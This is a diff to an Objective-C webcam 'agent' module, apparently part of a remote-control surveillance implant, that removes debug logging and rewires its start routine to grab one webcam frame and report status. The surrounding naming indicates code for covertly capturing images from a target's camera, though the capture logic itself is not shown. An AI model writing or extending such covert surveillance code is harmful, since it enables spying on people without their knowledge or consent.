@@ -146,11 +146,7 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
 
 - (BOOL)_startGrabImageWithFrame: (int)nFrame
                            every: (int)seconds
-{
-#ifdef DEBUG_WEBCAM
-  infoLog(@"startGrabImageWithFrame");
-#endif
-  
+{ 
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
   int count = 0;
@@ -253,10 +249,6 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
         }
     }
     
-#ifdef DEBUG_WEBCAM
-  infoLog(@"startGrabImageWitFrame: frames grabbing done!");
-#endif
-  
   [outerPool release];
  
   return YES;  
@@ -375,36 +367,19 @@ static RCSMAgentWebcam *sharedAgentWebcam = nil;
 - (void)start
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
-  
-#ifdef DEBUG_WEBCAM
-  infoLog(@"Agent web started");
-#endif
 
-  [mAgentConfiguration setObject: AGENT_RUNNING
-                          forKey: @"status"];
+  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
                           
-  if ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOP &&
-      [mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED)
-    {                         
-      if ([self _initSession] == YES)
+  if ([self _initSession] == YES)
+    {
+      if ([self _startGrabImageWithFrame: 1 every: 0] == YES)
         {
-          webcamStruct *wcRawData = (webcamStruct *)[[mAgentConfiguration objectForKey: @"data"] bytes];
-      
-          if ([self _startGrabImageWithFrame: wcRawData->numOfFrame
-                                       every: wcRawData->sleepTime] == YES)
-            {
 #ifdef DEBUG_WEBCAM
-              infoLog(@"Webcam grabbing done!");
+          infoLog(@"Webcam grabbing done!");
 #endif
-            }
-          else
-            {
-#ifdef DEBUG_WEBCAM
-              infoLog(@"An error occurred while grabbing from webcam");
-#endif
-            }
-          [self _releaseSession];
         }
+
+      [self _releaseSession];
     }
   
   [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
